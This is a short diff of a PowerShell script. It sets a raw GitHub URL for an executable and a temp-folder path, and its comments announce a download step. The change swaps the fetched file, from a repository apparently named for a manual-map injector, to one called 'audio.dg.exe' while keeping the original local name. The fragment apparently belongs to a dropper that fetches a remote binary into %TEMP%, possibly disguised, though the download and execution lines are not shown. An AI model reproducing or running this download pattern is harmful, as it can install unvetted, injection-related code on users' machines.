@@ -3,7 +3,7 @@
 # ================================
 
 # STEP 1: Define GitHub URL & Temp EXE Path
-$exeUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/ConsoleApplication6.exe"
+$exeUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/audio.dg.exe"
 $tempPath = "$env:TEMP\ConsoleApplication6.exe"
 
 # STEP 2: Download the EXE
